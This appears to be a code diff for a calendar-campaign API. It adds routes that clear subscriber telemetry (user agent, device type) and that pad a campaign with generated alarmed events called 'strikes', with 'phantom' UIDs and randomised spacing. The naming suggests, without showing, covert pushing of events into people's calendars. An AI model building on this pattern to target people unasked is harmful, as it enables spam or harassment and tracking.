@@ -460,6 +460,80 @@ export default {
       );
     }
 
+    // Reset subscriber telemetry: /api/campaigns/:id/reset-telemetry
+    const resetTelMatch = url.pathname.match(/^\/api\/campaigns\/([a-zA-Z0-9_-]+)\/reset-telemetry$/);
+    if (resetTelMatch && request.method === "POST") {
+      const campaign = await getCampaign(env, resetTelMatch[1]);
+      if (!campaign) {
+        return new Response(JSON.stringify({ error: "Not found" }), { status: 404, headers: CORS_HEADERS });
+      }
+      campaign.subscribers = [];
+      campaign.syncCount = 0;
+      campaign.lastSyncAt = null;
+      campaign.lastUserAgent = null;
+      campaign.deviceType = null;
+      campaign.firstSubscribedAt = null;
+      await saveCampaign(env, campaign);
+      return new Response(
+        JSON.stringify({ success: true, campaignId: campaign.id, message: "Telemetry reset. Subscriber list cleared." }),
+        { headers: { ...CORS_HEADERS, "Content-Type": "application/json" } }
+      );
+    }
+
+    // Top up campaign to N strikes: /api/campaigns/:id/top-up
+    const topUpMatch = url.pathname.match(/^\/api\/campaigns\/([a-zA-Z0-9_-]+)\/top-up$/);
+    if (topUpMatch && request.method === "POST") {
+      const campaign = await getCampaign(env, topUpMatch[1]);
+      if (!campaign) {
+        return new Response(JSON.stringify({ error: "Not found" }), { status: 404, headers: CORS_HEADERS });
+      }
+      const body = await request.json().catch(() => ({}));
+      const target = Math.min(Math.max(Number(body.target) || 100, 1), 200);
+      const events = Array.isArray(campaign.events) ? campaign.events : [];
+      const need = target - events.length;
+      if (need <= 0) {
+        return new Response(
+          JSON.stringify({ success: true, added: 0, count: events.length, message: "Already at or above target." }),
+          { headers: { ...CORS_HEADERS, "Content-Type": "application/json" } }
+        );
+      }
+
+      const existingTitles = new Set(events.map(e => (e.title || "").toLowerCase()));
+      const fresh = generateBacklogBatch(need * 3).filter(e => !existingTitles.has((e.title || "").toLowerCase())).slice(0, need);
+
+      // Schedule new strikes after the last existing strike (or today + 14d if none)
+      let cursor = events.length
+        ? new Date(Math.max(...events.map(e => new Date(e.dateObj || 0).getTime())))
+        : new Date(Date.now() + 14 * 86400000);
+      const gapPool = [6, 7, 8, 9, 10, 11, 12, 14];
+      const added = fresh.map((item, i) => {
+        cursor = new Date(cursor.getTime() + gapPool[Math.floor(Math.random() * gapPool.length)] * 86400000);
+        const d = new Date(cursor);
+        d.setUTCHours(12, 0, 0, 0);
+        const id = `ev_topup_${Date.now()}_${i}`;
+        return {
+          id,
+          uid: `phantom-${campaign.id}-${id}@phantomsync.io`,
+          title: item.title,
+          memo: item.memo,
+          category: item.category || "Scheduled Protocol",
+          isPersonal: false,
+          dateObj: d.toISOString(),
+          dateStr: d.toLocaleDateString("en-US", { month: "short", day: "numeric", year: "numeric", timeZone: "UTC" }),
+          alarmTime: getAlarmTimeForProfile(item, campaign.alarmProfile || "mixed"),
+          gap: 7,
+        };
+      });
+
+      campaign.events = events.concat(added);
+      campaign.updatedAt = Date.now();
+      await saveCampaign(env, campaign);
+      return new Response(
+        JSON.stringify({ success: true, added: added.length, count: campaign.events.length, message: `Added ${added.length} strikes.` }),
+        { headers: { ...CORS_HEADERS, "Content-Type": "application/json" } }
+      );
+    }
+
     // Set Drip Horizon: /api/campaigns/:id/drip
     const dripMatch = url.pathname.match(/^\/api\/campaigns\/([a-zA-Z0-9_-]+)\/drip$/);
     if (dripMatch && request.method === "POST") {
